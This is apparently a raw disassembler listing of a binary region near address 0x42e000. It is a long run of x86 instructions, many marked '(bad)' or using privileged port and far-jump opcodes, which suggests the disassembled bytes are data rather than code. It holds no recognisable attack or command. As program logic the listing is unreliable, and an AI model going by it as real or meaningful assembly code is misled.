  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x30fd5d0c]
  42dec3:	pop    ecx
  42dec4:	push   ds
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [edi-0x16],bl
  42dece:	sbb    bh,BYTE PTR [ebx-0x7c]
  42ded1:	dec    esi
  42ded2:	mov    dl,0x8b
  42ded4:	call   0x2419:0xd7af118
  42dedb:	xor    eax,0xeb408451
  42dee0:	xchg   ecx,eax
  42dee1:	sbb    DWORD PTR [ebx],edi
  42dee3:	xchg   ch,bl
  42dee5:	pop    eax
  42dee6:	cmc    
  42dee7:	test   DWORD PTR [edx+0x7a],0xc0cc93ab
  42deee:	loop   0x42df43
  42def0:	dec    ecx
  42def1:	lahf   
  42def2:	mov    ch,0xe8
  42def4:	loop   0x42df33
  42def6:	mov    eax,0x947c33cb
  42defb:	inc    esi
  42defc:	fidiv  WORD PTR [ecx-0x40]
  42deff:	sub    eax,0x3a0194f4
  42df04:	push   edx
  42df05:	js     0x42ded6
  42df07:	add    al,0x98
  42df09:	xchg   ecx,eax
  42df0a:	mov    ah,0xa2
  42df0c:	inc    esi
  42df0d:	mov    dh,0x67
  42df0f:	mov    ebx,0xe22b364a
  42df14:	jmp    0x42df62
  42df16:	lea    esi,[ebp-0x1a]
  42df19:	inc    ebp
  42df1a:	das    
  42df1b:	mov    al,0x2
  42df1d:	dec    ebx
  42df1e:	xchg   ecx,eax
  42df1f:	jbe    0x42dec3
  42df21:	(bad)  
  42df22:	or     eax,0x120c68c2
  42df27:	imul   eax,DWORD PTR [ecx],0x6e
  42df2a:	in     eax,0x75
  42df2c:	sbb    eax,0x61da8ef6
  42df31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df32:	cmp    al,0xbd
  42df34:	sbb    DWORD PTR [ebx],eax
  42df36:	pop    ds
  42df37:	dec    ebx
  42df38:	mov    ds:0x9c09c273,al
  42df3d:	stc    
  42df3e:	pop    esp
  42df3f:	sub    BYTE PTR [eax+ecx*1+0x53995a99],0xc8
  42df47:	ins    BYTE PTR es:[edi],dx
  42df48:	int3   
  42df49:	add    al,0xcc
  42df4b:	frstor [edx+0xa]
  42df4e:	clc    
  42df4f:	push   ecx
  42df50:	into   
  42df51:	out    0x28,eax
  42df53:	mov    DWORD PTR [eax-0x38e7a4f2],esi
  42df59:	in     al,0x0
  42df5b:	mov    ds:0xb284cdd,al
  42df60:	xchg   eax,eax
  42df62:	sub    DWORD PTR [ecx],0xffffffc4
  42df65:	xchg   ebp,eax
  42df66:	pop    es
  42df67:	scas   al,BYTE PTR es:[edi]
  42df68:	shr    DWORD PTR [ebp+0x3f31ead8],0xe5
  42df6f:	(bad)  
  42df70:	xchg   ecx,eax
  42df71:	ret    0xaab3
  42df74:	sbb    edx,DWORD PTR [ecx]
  42df76:	adc    DWORD PTR [ebp+0x4014f978],0xbeef3bb4
  42df80:	cli    
  42df81:	pop    edi
  42df82:	jnp    0x42df6b
  42df84:	aaa    
  42df85:	std    
  42df86:	lock sti 
  42df88:	fist   DWORD PTR [edi+0x1a4ec7d2]
  42df8e:	cmp    al,0x1
  42df90:	rcr    BYTE PTR [ebp-0x5f],0xb5
  42df94:	pop    edi
  42df95:	pop    edx
  42df96:	or     esi,ebp
  42df98:	dec    ebp
  42df99:	jmp    0x66f1b9b0
  42df9e:	sub    BYTE PTR [edi+esi*2-0x23e2a1b3],0x3f
  42dfa6:	jnp    0x42df2f
  42dfa8:	scas   eax,DWORD PTR es:[edi]
  42dfa9:	in     eax,dx
  42dfaa:	jmp    0x10588614
  42dfaf:	stos   BYTE PTR es:[edi],al
  42dfb0:	(bad)  
  42dfb2:	push   0x595856e1
  42dfb7:	dec    edx
  42dfb8:	pop    edx
  42dfb9:	lahf   
  42dfba:	shld   DWORD PTR [esi+0x59],eax,cl
  42dfbe:	clc    
  42dfbf:	pop    edx
  42dfc0:	mov    al,0xab
	...
  42e032:	add    BYTE PTR [eax],al
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x7c8cd1e2],0xf0
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    dl,ch
  42e04d:	stos   BYTE PTR es:[edi],al
  42e04e:	fucom  st(3)
  42e050:	je     0x42e04c
  42e052:	inc    edi
  42e053:	cli    
  42e054:	mov    al,ds:0x560487e9
  42e059:	push   esi
  42e05a:	cvtdq2ps xmm0,XMMWORD PTR [esi+edx*1]
  42e05e:	(bad)  
  42e060:	push   esp
  42e061:	push   cs
  42e062:	push   esp
  42e063:	inc    eax
  42e064:	lods   eax,DWORD PTR ds:[esi]
  42e065:	inc    eax
  42e066:	cmp    DWORD PTR [esi+0x2c3185b2],0xffffff91
  42e06d:	shl    esp,cl
  42e06f:	mov    ebx,0x487f3b9d
  42e074:	add    BYTE PTR [edi-0x27],ah
  42e077:	sub    eax,0x5c9a5e7d
  42e07c:	stos   BYTE PTR es:[edi],al
  42e07d:	push   ss
  42e07e:	xchg   BYTE PTR ds:0x2f9cfd6,al
  42e084:	ret    
  42e085:	push   esi
  42e086:	adc    DWORD PTR [edx],edx
  42e088:	pop    es
  42e089:	or     edx,edx
  42e08b:	mov    ecx,0x148899a7
  42e090:	jnp    0x42e10e
  42e092:	pop    es
  42e093:	jl     0x42e091
  42e095:	popa   
  42e096:	mov    edx,0x3a2e6725
  42e09b:	daa    
  42e09c:	inc    eax
  42e09d:	std    
  42e09e:	rol    BYTE PTR [ecx],cl
  42e0a0:	pop    ebx
  42e0a1:	pop    DWORD PTR [eax]
  42e0a3:	aas    
  42e0a4:	enter  0xa01,0xb7
  42e0a8:	sub    dl,BYTE PTR [edi-0x7]
  42e0ab:	(bad)  
  42e0ae:	mov    al,0xb9
  42e0b0:	shr    esi,cl
  42e0b2:	repz mov edi,DWORD PTR [ecx*8+0x1f444f06]
  42e0ba:	or     DWORD PTR [eax+0x7e3621e3],edx
  42e0c0:	xor    esp,DWORD PTR [ecx-0x50e3e8eb]
  42e0c6:	push   0xa
  42e0c8:	cdq    
  42e0c9:	mov    ?,WORD PTR [ebx]
  42e0cb:	dec    edx
  42e0cc:	jns    0x42e09f
  42e0ce:	stos   DWORD PTR es:[edi],eax
  42e0cf:	mov    ah,0x8c
  42e0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0d2:	cmp    eax,0x4613a612
  42e0d7:	cmp    esp,0xe1791581
  42e0dd:	retf   0xbe5f
  42e0e0:	cli    
  42e0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0e2:	call   0x245f:0x55c7afd2
  42e0e9:	sbb    DWORD PTR [edx-0x54],ebx
  42e0ec:	lds    ebx,FWORD PTR [ebx+edx*8]
  42e0ef:	mov    edi,0x2d589bee
  42e0f4:	pop    ss
  42e0f5:	cmp    al,0x51
  42e0f7:	jnp    0x42e114
  42e0f9:	push   edi
  42e0fa:	add    al,0xd5
  42e0fc:	cli    
  42e0fd:	mov    al,ds:0x8f742afc
  42e102:	imul   edx,edi,0xffffffdb
  42e105:	loopne 0x42e0f3
  42e107:	mov    dh,0x2a
  42e109:	out    dx,al
  42e10a:	dec    edx
  42e10b:	cs dec ebx
  42e10d:	dec    ebp
  42e10e:	or     ch,BYTE PTR [edi+0x33e15963]
  42e114:	popf   
  42e115:	enter  0x922c,0xc3
  42e119:	les    ecx,FWORD PTR [ebp+0x1e658ee2]
  42e11f:	rcr    DWORD PTR [edx+0x23],0xe3
  42e123:	es mov eax,0x51e3040f
  42e129:	dec    ecx
  42e12a:	xor    dh,dh
  42e12c:	in     eax,0x30
  42e12e:	sub    al,0x99
  42e130:	or     BYTE PTR [edx],al
  42e132:	ins    BYTE PTR es:[edi],dx
  42e133:	pop    eax
  42e134:	jns    0x42e139
  42e136:	fcomi  st,st(6)
  42e138:	out    0x5f,eax
  42e13a:	and    edi,DWORD PTR [esi]
  42e13c:	and    eax,0x66dc5a51
  42e141:	aaa    
	...
  42e1b2:	add    BYTE PTR [eax],al
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xfee3f271
  42e1c3:	ja     0x42e1cf
  42e1c5:	call   0x138e1cb
  42e1ca:	add    BYTE PTR [eax],al
  42e1cc:	icebp  
  42e1cd:	sbb    esp,ecx
  42e1cf:	das    
  42e1d0:	aas    
  42e1d1:	dec    ebp
  42e1d2:	mov    dh,0x9b
  42e1d4:	and    eax,0xce5f8347
  42e1d9:	jl     0x42e181
  42e1db:	dec    ecx
  42e1dc:	loope  0x42e189
  42e1de:	in     eax,0x65
  42e1e0:	pop    ecx
  42e1e1:	and    al,0x2d
  42e1e3:	lahf   
  42e1e4:	push   edx
  42e1e5:	jmp    0x7ee0de5
  42e1ea:	lds    esi,FWORD PTR [edx+0x7f]
  42e1ed:	data16 sti 
  42e1ef:	mov    ds:0x8b3bca78,eax
  42e1f4:	cmp    eax,0x222a3118
  42e1f9:	fst    QWORD PTR [edi-0x40e19489]
  42e1ff:	xchg   edx,ebx
  42e201:	repnz sbb BYTE PTR [ebx+esi*8+0x33],al
  42e206:	or     ebx,DWORD PTR [edx]
  42e208:	cmp    eax,0xc2e354ba
  42e20d:	cdq    
  42e20e:	test   DWORD PTR [eax-0x51],ecx
  42e211:	xor    ebx,DWORD PTR ds:0xc52e2f93
  42e217:	jge    0x42e231
  42e219:	push   ebp
  42e21a:	mov    dl,0x87
  42e21c:	lds    edx,FWORD PTR [ecx-0x26]
  42e21f:	sbb    esp,DWORD PTR [edx-0x39]
  42e222:	not    bh
  42e224:	xchg   ebp,eax
  42e225:	cwde   
  42e226:	jno    0x42e243
  42e228:	push   ecx
  42e229:	shr    BYTE PTR gs:[edi+0x4f],0xb4
  42e22e:	sti    
  42e22f:	jbe    0x42e1ca
  42e231:	nop
  42e232:	xor    eax,0xd1f30a6a
  42e237:	mov    eax,ds:0x34dafc76
  42e23c:	leave  
  42e23d:	mov    ch,0x83
  42e23f:	faddp  st(4),st
  42e241:	push   edx
  42e242:	je     0x42e2a1
  42e244:	mov    edx,0x3679d32
  42e249:	ss icebp 
  42e24b:	mov    dh,0x96
  42e24d:	pop    eax
  42e24e:	loope  0x42e233
  42e250:	jmp    0x42e27c
  42e252:	aam    0x9c
  42e254:	rol    DWORD PTR gs:[esi+0x49],cl
  42e258:	cdq    
  42e259:	jp     0x42e239
  42e25b:	xor    DWORD PTR [edi],0xffffff9e
  42e25e:	mov    ebp,0x898ea6a4
  42e263:	adc    BYTE PTR [edi+0x62],al
  42e266:	rcr    ebx,0x7e
  42e269:	push   cs
  42e26a:	dec    edi
  42e26b:	cmc    
  42e26c:	fild   WORD PTR [eax+0x28]
  42e26f:	cli    
  42e270:	rol    ecx,0xaf
  42e273:	shrd   DWORD PTR cs:[ebp-0x8],eax,0x83
  42e279:	fisttp DWORD PTR [ecx]
  42e27b:	nop
  42e27c:	and    BYTE PTR [edx],al
  42e27e:	ja     0x42e25d
  42e280:	push   0x1b2aaf65
  42e285:	pusha  
  42e286:	jo     0x42e24a
  42e288:	in     eax,0x24
  42e28a:	data16 gs (bad) 
  42e28d:	pop    ecx
  42e28e:	pop    edi
  42e28f:	aad    0x85
  42e291:	jle    0x42e2a8
  42e293:	in     al,0x6d
  42e295:	xchg   esp,eax
  42e296:	push   es
  42e297:	ja     0x42e2e4
  42e299:	fnstcw WORD PTR [ecx-0x29]
  42e29c:	mov    esp,0xf9c98118
  42e2a1:	sub    BYTE PTR [ebp-0x281a456a],ch
  42e2a7:	cmp    ch,BYTE PTR [eax-0x60]
  42e2aa:	fist   WORD PTR [ebx+0x48e63673]
  42e2b0:	or     al,0x43
  42e2b2:	or     ch,BYTE PTR [ebx-0x74]
  42e2b5:	cld    
  42e2b6:	xchg   ebx,eax
  42e2b7:	adc    DWORD PTR [edx],0x88acab17
  42e2bd:	pushf  
  42e2be:	in     eax,dx
  42e2bf:	repz daa 
  42e2c1:	xchg   BYTE PTR [eax],al
	...
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [ebp-0x37],ecx
  42e342:	pop    eax
  42e343:	in     al,dx
  42e344:	add    cl,ch
  42e346:	add    DWORD PTR [eax],eax
  42e348:	test   BYTE PTR [eax],0x0
  42e34b:	add    dl,bh
  42e34d:	outs   dx,BYTE PTR ds:[esi]
  42e34e:	icebp  
  42e34f:	xchg   edx,eax
  42e350:	or     BYTE PTR [ecx+0x75],ch
  42e353:	fnstsw WORD PTR [ecx-0x6c1a3a52]
  42e359:	mov    ds:0x959b3ce3,eax
  42e35e:	push   0x50
  42e360:	sub    edx,DWORD PTR ds:0xd04d50dd
  42e366:	add    BYTE PTR [ebp+0x27],bl
  42e369:	and    BYTE PTR [ebx],cl
  42e36b:	out    0x34,eax
  42e36d:	mov    bh,0xdb
  42e36f:	pop    edi
  42e370:	call   0x6a0bf4ab
  42e375:	retf   
  42e376:	aas    
  42e377:	aaa    
  42e378:	mov    bl,0x7b
  42e37a:	xor    ecx,DWORD PTR [ebp-0x19e0e0ff]
  42e380:	xchg   esi,eax
  42e381:	sub    bh,BYTE PTR [edi]
  42e383:	test   al,0x5a
  42e385:	jne    0x42e3cb
  42e387:	xchg   edx,eax
  42e388:	add    al,0x70
  42e38a:	in     eax,dx
  42e38b:	pop    esp
  42e38c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e38d:	lock ror DWORD PTR [eax-0x24],0x3c
  42e392:	ins    BYTE PTR es:[edi],dx
  42e393:	add    eax,0x7b9ce718
  42e398:	dec    ecx
  42e399:	sbb    ah,BYTE PTR [edi-0x396ce9dc]
  42e39f:	ss aas 
  42e3a1:	ds dec ebx
  42e3a3:	sbb    BYTE PTR [edx-0x9bf79a],dl
  42e3a9:	push   esp
  42e3aa:	or     BYTE PTR [edx-0x59],cl
  42e3ad:	je     0x42e339
  42e3af:	mov    edi,0xe3fad165
  42e3b4:	or     ch,ah
  42e3b6:	push   ebx
  42e3b7:	outs   dx,BYTE PTR ds:[esi]
  42e3b8:	or     esp,ebp
  42e3ba:	(bad)  
  42e3bb:	push   ds
  42e3bc:	(bad)
  42e3bf:	mov    ds:0x36d56397,eax
  42e3c4:	jbe    0x42e386
  42e3c6:	test   edi,esp
  42e3c8:	inc    edi
  42e3c9:	inc    ebp
  42e3ca:	push   edx
  42e3cb:	push   cs
  42e3cc:	add    DWORD PTR [edi-0x26451895],esi
  42e3d2:	repz jmp 0xdc0650c5
  42e3d8:	in     al,dx
  42e3d9:	inc    ecx
  42e3da:	aam    0x43
  42e3dc:	ins    DWORD PTR es:[edi],dx
  42e3dd:	cmovns esi,DWORD PTR [ebx-0x5f617f71]
  42e3e4:	fist   WORD PTR [esi+ebp*2-0x4ec5654b]
  42e3eb:	or     BYTE PTR [esi+0x2a16889a],dl
  42e3f1:	pushf  
  42e3f2:	addr16 fs xor al,0xe0
  42e3f6:	std    
  42e3f7:	and    eax,0x616d1ecc
  42e3fc:	(bad)  
  42e3fd:	js     0x42e39d
  42e3ff:	and    ebx,esi
  42e401:	sub    eax,0x435d1b0f
  42e406:	sub    esi,esi
  42e408:	mov    eax,0x7b2313e0
  42e40d:	pop    esi
  42e40e:	sbb    al,BYTE PTR [edx-0x40]
  42e411:	dec    esp
  42e412:	in     eax,0xeb
  42e414:	fcmovnb st,st(0)
  42e416:	push   0xfeb2976d
  42e41b:	jb     0x42e3e4
  42e41d:	or     DWORD PTR [edi-0x2c760f58],ecx
  42e423:	dec    edi
  42e424:	cdq    
  42e425:	ret    
  42e426:	out    0xd2,al
  42e428:	lods   al,BYTE PTR ds:[esi]
  42e429:	mov    eax,0xa76ded4d
  42e42e:	push   esp
  42e42f:	inc    edi
  42e430:	ins    DWORD PTR es:[edi],dx
  42e431:	push   ds
  42e432:	das    
  42e433:	jg     0x42e47f
  42e435:	fs (bad) 
  42e437:	into   
  42e438:	cli    
  42e439:	sti    
  42e43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e43b:	es pushf 
  42e43d:	xchg   BYTE PTR [ebx-0x8],ah
  42e440:	xor    al,al
	...
  42e4b2:	add    BYTE PTR [eax],al
  42e4b4:	cdq    
  42e4b5:	cmc    
  42e4b6:	adc    BYTE PTR [ebx-0x12],0x77
  42e4ba:	fcos   
  42e4bc:	pavgw  mm4,mm3
  42e4bf:	mov    esp,0xa9d82961
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    BYTE PTR [ecx],al
  42e4cd:	cmp    eax,0xe735ac3f
  42e4d2:	mov    ?,WORD PTR [edx+eax*4]
  42e4d5:	pushf  
  42e4d6:	dec    eax
  42e4d7:	cmp    dl,BYTE PTR [esi]
  42e4d9:	pop    edi
  42e4da:	scas   eax,DWORD PTR es:[edi]
  42e4db:	add    al,0x97
  42e4dd:	out    dx,eax
  42e4de:	(bad)  
  42e4df:	push   esp
  42e4e0:	xor    al,0x6b
  42e4e2:	xchg   sp,ax
  42e4e4:	cmp    dl,BYTE PTR [esi+0x4f]
  42e4e7:	adc    DWORD PTR [edx-0x1d45eb48],edx
  42e4ed:	dec    edx
  42e4ee:	js     0x42e51f
  42e4f0:	sbb    DWORD PTR [ebx+0x5ed51eab],edx
  42e4f6:	cmp    cl,BYTE PTR [eax]
  42e4f8:	mov    ds:0xde2b7a81,eax
  42e4fd:	mov    dh,dh
  42e4ff:	jg     0x42e51a
  42e501:	pushf  
  42e502:	adc    ch,BYTE PTR [ebp-0x17]
  42e505:	cmp    dl,BYTE PTR [ebp-0x289591df]
  42e50b:	ss repnz dec ebx
  42e50e:	adc    esp,ebp
  42e510:	inc    esi
  42e511:	and    al,0x50
  42e513:	adc    al,0x1b
  42e515:	xor    bh,dl
  42e517:	mov    eax,0x4791b655
  42e51c:	mov    esp,esi
  42e51e:	ret    0x9e26
  42e521:	imul   DWORD PTR [ebx+0x72]
  42e524:	inc    esp
  42e525:	cmp    al,0xc5
  42e527:	fstp   DWORD PTR [ebp-0x2c2ee68e]
  42e52d:	popf   
  42e52e:	dec    edi
  42e52f:	js     0x42e55f
  42e531:	jmp    0x721d:0x3e9b2dcd
  42e538:	scas   al,BYTE PTR es:[edi]
  42e539:	adc    ah,BYTE PTR [ebp-0x34]
  42e53c:	fbstp  TBYTE PTR [eax-0x50f206d3]
  42e542:	les    esp,FWORD PTR [edx]
  42e544:	jnp    0x42e53b
  42e546:	vsubss xmm0,xmm4,DWORD PTR ds:0x8e91ca28
  42e54e:	ins    DWORD PTR es:[edi],dx
  42e54f:	mov    edx,0xa0a2b826
  42e554:	adc    eax,0x3b9be809
  42e559:	jge    0x42e51c
  42e55b:	cmp    BYTE PTR [ecx+0xb9f4bf6],0xa3
  42e562:	mov    BYTE PTR [ecx],cl
  42e564:	adc    DWORD PTR [edx+0x18],0x8757b72
  42e56b:	lods   eax,DWORD PTR ds:[esi]
  42e56c:	inc    ebp
  42e56d:	mov    edx,0x65e023d6
  42e572:	mov    ?,WORD PTR [eiz*4+0x2373b9c]
  42e579:	sbb    ecx,DWORD PTR [edi-0x36]
  42e57c:	dec    ebx
  42e57d:	cmp    al,0xbf
  42e57f:	pop    esi
  42e580:	fnstsw WORD PTR [ecx-0x7411bec3]
  42e586:	sbb    eax,0x13dff1b2
  42e58b:	clc    
  42e58c:	xchg   esp,eax
  42e58d:	lods   eax,DWORD PTR ds:[esi]
  42e58e:	push   edi
  42e58f:	enter  0x5e89,0x49
  42e593:	ja     0x42e549
  42e595:	and    eax,DWORD PTR [edi-0x75eeb196]
  42e59b:	cmp    BYTE PTR [eax+eax*2+0x3c907050],ch
  42e5a2:	jne    0x42e58c
  42e5a4:	popf   
  42e5a5:	sub    ecx,edi
  42e5a7:	sbb    BYTE PTR [esi-0x8],bh
  42e5aa:	jmp    0xf808:0x75621933
  42e5b1:	mov    eax,ds:0x104c3e8a
  42e5b6:	ficomp WORD PTR [ebp*4+0x672a3c7c]
  42e5bd:	aaa    
  42e5be:	loopne 0x42e5ee
  42e5c0:	test   al,0xc0
	...
  42e632:	add    BYTE PTR [eax],al
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	sbb    al,0xfc
  42e642:	jmp    0xf600:0x1eaecc8
  42e649:	add    BYTE PTR [eax],al
  42e64b:	add    bh,dl
  42e64d:	dec    ecx
  42e64e:	out    dx,al
  42e64f:	inc    esp
  42e650:	mov    ecx,0x2d50d7ef
  42e655:	jnp    0x42e6b0
  42e657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e658:	imul   ebx,DWORD PTR [edi],0xfffffffb
  42e65b:	mov    DWORD PTR [eax],esp
  42e65d:	int3   
  42e65e:	jmp    0x42e602
  42e660:	dec    ecx
  42e661:	and    ah,dl
  42e663:	aaa    
  42e664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e665:	retf   
  42e666:	dec    ch
  42e668:	in     al,dx
  42e669:	(bad)  
  42e66a:	rol    DWORD PTR [edx-0x46],cl
  42e66d:	cdq    
  42e66e:	mov    eax,ds:0xa561bf64
  42e673:	lods   al,BYTE PTR ds:[esi]
  42e674:	jmp    0x394926e
  42e679:	fadd   QWORD PTR ds:0xee257f84
  42e67f:	fdivr  st(0),st
  42e681:	inc    ebp
  42e682:	mov    al,0xe6
  42e684:	inc    ebx
  42e685:	jge    0x42e6eb
  42e687:	out    0xae,al
  42e689:	pushf  
  42e68a:	mov    esi,0x4e0d90
  42e68f:	mov    al,ss:0xabccb743
  42e695:	mov    esp,0x71d4a5a1
  42e69a:	dec    ebp
  42e69b:	jg     0x42e67e
  42e69d:	lock (bad) 
  42e69f:	jmp    0xde8f3b1
  42e6a4:	push   edi
  42e6a5:	xor    eax,0x7dbb0074
  42e6aa:	and    DWORD PTR [esp+ebp*1],eax
  42e6ad:	xchg   esp,eax
  42e6ae:	rol    BYTE PTR [esi],0x8c
  42e6b1:	jmp    0xd4bf:0x90b92843
  42e6b8:	fisub  WORD PTR [eax+edi*2]
  42e6bb:	or     ch,0x85
  42e6be:	sub    al,0xbe
  42e6c0:	xlat   BYTE PTR ds:[ebx]
  42e6c1:	ins    BYTE PTR es:[edi],dx
  42e6c2:	jl     0x42e6a5
  42e6c4:	fmul   QWORD PTR [edi-0x49]
  42e6c7:	sti    
  42e6c8:	add    BYTE PTR [edi+0x54],ah
  42e6cb:	adc    eax,0x66793aba
  42e6d0:	mov    edx,0xb2215fcd
  42e6d5:	ss retf 
  42e6d7:	push   ss
  42e6d8:	jp     0x42e6a1
  42e6da:	jecxz  0x42e73e
  42e6dc:	and    eax,0x9ea8ccc8
  42e6e1:	daa    
  42e6e2:	ret    
  42e6e3:	push   esp
  42e6e4:	dec    edx
  42e6e5:	ins    DWORD PTR es:[edi],dx
  42e6e6:	jne    0x42e69a
  42e6e8:	lea    edi,[edx+0x7689b9ac]
  42e6ee:	xchg   esp,esi
  42e6f0:	dec    ebx
  42e6f1:	bound  edx,QWORD PTR [ebx+ebx*2]
  42e6f4:	sub    al,0x45
  42e6f6:	or     DWORD PTR [edi+0x63],0xffffffe0
  42e6fa:	xor    eax,0x73a16c80
  42e6ff:	adc    al,0xef
  42e701:	ret    0x68af
  42e704:	ror    al,1
  42e706:	mov    dh,0xdb
  42e708:	adc    eax,DWORD PTR [esi-0x2e2757fd]
  42e70e:	jg     0x42e6f4
  42e710:	inc    ecx
  42e711:	daa    
  42e712:	pop    esi
  42e713:	test   BYTE PTR [eax],al
  42e715:	arpl   WORD PTR [bx+si+0x4164],bx
  42e71a:	and    edx,edi
  42e71c:	pushf  
  42e71d:	jmp    0xbc326833
  42e722:	sbb    ah,BYTE PTR [esi-0x71c1e6c8]
  42e728:	xor    eax,0xfe667dc5
  42e72d:	ds dec edx
  42e72f:	mov    ds:0x22414f6e,al
  42e734:	sbb    DWORD PTR [edx],0xf461b9fc
  42e73a:	mov    cl,0x7
  42e73c:	imul   ebx,ebp,0xffffff8f
  42e73f:	inc    esp
  42e740:	loope  0x42e777
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x70f2aa8a]
  42e7c1:	mov    ah,0xd6
  42e7c4:	loop   0x42e7b1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	test   BYTE PTR [eax],0x0
  42e7cb:	add    BYTE PTR [esi-0x61],dl
  42e7ce:	jno    0x42e7e8
  42e7d0:	cdq    
  42e7d1:	icebp  
  42e7d2:	xor    ebx,DWORD PTR [esi+eax*2-0x69]
  42e7d6:	ins    BYTE PTR es:[edi],dx
  42e7d7:	sbb    BYTE PTR [edx+0x35],dh
  42e7da:	add    eax,0x5704affa
  42e7df:	cmp    DWORD PTR [ecx+ebx*8-0x28],0x3c98986b
  42e7e7:	dec    eax
  42e7e8:	fstp   QWORD PTR [ecx-0x34a6c8d9]
  42e7ee:	push   ss
  42e7ef:	(bad)  
  42e7f0:	adc    DWORD PTR [esi-0x5ad4a50],edi
  42e7f6:	sub    eax,0x7a3a7d0d
  42e7fb:	aam    0x1e
  42e7fd:	aad    0x70
  42e7ff:	cmp    DWORD PTR [edx-0x4d],esp
  42e802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e803:	xor    DWORD PTR [ebp-0x1a],ebx
  42e806:	cs js  0x42e817
  42e809:	(bad)  
  42e80a:	loop   0x42e7d8
  42e80c:	xchg   esi,eax
  42e80d:	sub    cl,BYTE PTR [ecx-0x6f7370c9]
  42e813:	jne    0x42e7d8
  42e815:	pop    ss
  42e816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e817:	cmp    DWORD PTR [edx-0x34],edi
  42e81a:	push   ebx
  42e81b:	test   edx,ecx
  42e81d:	iret   
  42e81e:	popa   
  42e81f:	and    BYTE PTR [ecx*4-0x64930159],cl
  42e826:	hlt    
  42e827:	xor    al,0x1b
  42e829:	call   0x8e03:0x2e710bfa
  42e830:	push   esp
  42e831:	adc    BYTE PTR [edx+0x55abdfaa],dh
  42e837:	xchg   esi,eax
  42e838:	mov    ebx,0x586d8f81
  42e83d:	mov    al,ds:0x11832954
  42e842:	add    esi,DWORD PTR [ebx+0x3]
  42e845:	(bad)  
  42e846:	popa   
  42e847:	out    0x36,al
  42e849:	push   ss
  42e84a:	pop    es
  42e84b:	ja     0x42e887
  42e84d:	not    BYTE PTR [ebx-0x46]
  42e850:	xor    BYTE PTR [eax+0x1e],0xbf
  42e854:	dec    esp
  42e855:	push   edi
  42e856:	add    cl,BYTE PTR [ebp-0x10]
  42e859:	adc    eax,0xd5d5faf1
  42e85e:	push   edx
  42e85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e860:	lock sub BYTE PTR [edi-0x5944cdee],bh
  42e867:	pop    ds
  42e868:	fcmovbe st,st(6)
  42e86a:	adc    al,0x1a
  42e86c:	push   cs
  42e86d:	mov    BYTE PTR [ebp+0x2e95fba9],0x29
  42e874:	sbb    BYTE PTR [ebx],dh
  42e876:	fld    TBYTE PTR [esi+0x2d]
  42e879:	xor    DWORD PTR [ebx],edi
  42e87b:	faddp  st(6),st
  42e87d:	xchg   esp,eax
  42e87e:	and    ecx,ebp
  42e880:	cs inc esi
  42e882:	outs   dx,DWORD PTR ds:[esi]
  42e883:	cs js  0x42e8a7
  42e886:	stos   BYTE PTR es:[edi],al
  42e887:	stos   DWORD PTR es:[edi],eax
  42e888:	dec    esp
  42e889:	das    
  42e88a:	cmp    al,dl
  42e88c:	cmp    eax,0xc8b33346
  42e891:	(bad)  
  42e892:	pop    dx
  42e894:	xchg   ebp,eax
  42e895:	mov    WORD PTR [edx],?
  42e897:	es in  eax,0x48
  42e89a:	and    eax,0x8fd57e80
  42e89f:	mov    al,0x6f
  42e8a1:	xlat   BYTE PTR ds:[ebx]
  42e8a2:	(bad)  
  42e8a4:	icebp  
  42e8a5:	add    al,BYTE PTR [ebp+0x228f1a79]
  42e8ab:	outs   dx,DWORD PTR ds:[esi]
  42e8ac:	fmulp  st(4),st
  42e8ae:	shr    al,1
  42e8b0:	push   ebp
  42e8b1:	cmp    edx,0x3
  42e8b4:	mov    ecx,0x8ff4b343
  42e8b9:	loop   0x42e8d6
  42e8bb:	loop   0x42e935
  42e8bd:	mov    al,0x68
  42e8bf:	in     eax,dx
  42e8c0:	pop    esi
  42e8c1:	pop    ebp
	...
  42e932:	add    BYTE PTR [eax],al
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x27
  42e941:	push   edi
  42e942:	mov    esp,esp
